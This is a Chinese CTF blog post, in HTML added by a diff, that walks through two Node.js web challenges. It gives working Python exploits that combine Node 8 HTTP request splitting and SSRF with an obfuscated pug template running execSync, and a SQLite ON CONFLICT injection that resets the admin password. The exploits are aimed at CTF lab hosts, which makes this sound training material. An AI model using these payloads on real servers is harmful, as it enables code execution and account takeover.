@@ -1,0 +1,491 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>nodejs题目记录 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/8.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="nodejs题目记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-10 22:06" pubdate>
+        2022年1月10日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      713 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      12
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">nodejs题目记录</h1>
+            
+            <div class="markdown-body">
+              <h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://r3billions.com/writeup-split-second/">出题人参考的题目</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">出题人自己思路</a></p>
+<p>题目也挺老了感觉，这里的node版本为8，是存在http拆分请求攻击的。给了源码，审计一下。nodejs走私打ssrf。自己写的没打通，看网上有些也不打通，环境会崩，找了一个能打通。这里将字符unicode编码，因为node8采用的单字节latin编码，会将高字节位截掉，只剩下低字节位。也可用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag.txt&#39;);</code></p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynWjDdj9HcJ7ILyVa</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>body = <span class="hljs-string">&quot;&quot;&quot;------WebKitFormBoundarynWjDdj9HcJ7ILyVa</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">------WebKitFormBoundarynWjDdj9HcJ7ILyVa--</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(body), body) \<br>    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>) \<br>    + <span class="hljs-string">&#x27;GET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span>  <span class="hljs-comment">#闭合下一个请求</span><br><span class="hljs-built_in">print</span>(payload)<br>requests.get(<br>    <span class="hljs-string">&#x27;http://68d9e1b4-926e-4d78-974c-b5eed4e09526.node4.buuoj.cn:81/core?q=&#x27;</span> + payload)<br><br><span class="hljs-built_in">print</span>(requests.get(<br>    <span class="hljs-string">&#x27;http://68d9e1b4-926e-4d78-974c-b5eed4e09526.node4.buuoj.cn:81/?action=shell&#x27;</span>).text)<br></code></pre></div></td></tr></table></figure>
+
+<h1 id="hackthebox-Weather-App"><a href="#hackthebox-Weather-App" class="headerlink" title="[hackthebox] Weather App"></a>[hackthebox] Weather App</h1><p>node考点一样但是多加了一个sqlite注入。</p>
+<p>查询天气处存在http请求拆分打ssrf</p>
+<p><img src="https://img-blog.csdnimg.cn/de3532e7f2754382822d63865613f97e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>稍微改改上面的脚本。抓包将生成的payload发包，发现可接受到</p>
+<p><img src="https://img-blog.csdnimg.cn/fae549d9f7f74697b9542fd34b9d9b5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>sqlite中存在一个插入和一个查询操作</p>
+<p><img src="https://img-blog.csdnimg.cn/81b6e4f18c1841d0906196c4489db839.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里利用<code>admin&#39; ON CONFLICT(username) DO UPDATE set password=&#39;123&#39;-+</code>来闭合插入语句，当插入存在冲突时自动更新密码</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /register HTTP/1.1</span><br><span class="hljs-string">Host: 167.99.202.131:32102</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 85</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=admin&amp;password=admin&#x27; ON CONFLICT(username) DO UPDATE set password=&#x27;123&#x27;-+</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload \<br>    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>)                \<br>    + <span class="hljs-string">&#x27;\u010d\u010aGET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span><br><br>data = &#123;<span class="hljs-string">&quot;endpoint&quot;</span>:<span class="hljs-string">f&#x27;127.0.0.1/xxx?p=1<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>,<br>        <span class="hljs-string">&quot;city&quot;</span>:<span class="hljs-string">&quot;uk&quot;</span>,<br>        <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;London&quot;</span>&#125;<br><span class="hljs-comment"># print(json.dumps(data))</span><br>res = requests.post(<span class="hljs-string">&#x27;http://167.99.202.131:32102/api/weather&#x27;</span>,data=json.dumps(data),headers=&#123;<span class="hljs-string">&quot;Content-type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>,<br>                                                                                 <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>&#125;)<br>flag = requests.post(<span class="hljs-string">&quot;http://167.99.202.131:32102/login&quot;</span>,data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(flag.text)<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/842d24145db140aaafec359b2a0ad2f2.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/nodejs/">nodejs</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/18/2022-1-18-SCTF%E5%A4%8D%E7%8E%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SCTF复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/16/2021-11-L3hctf/">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
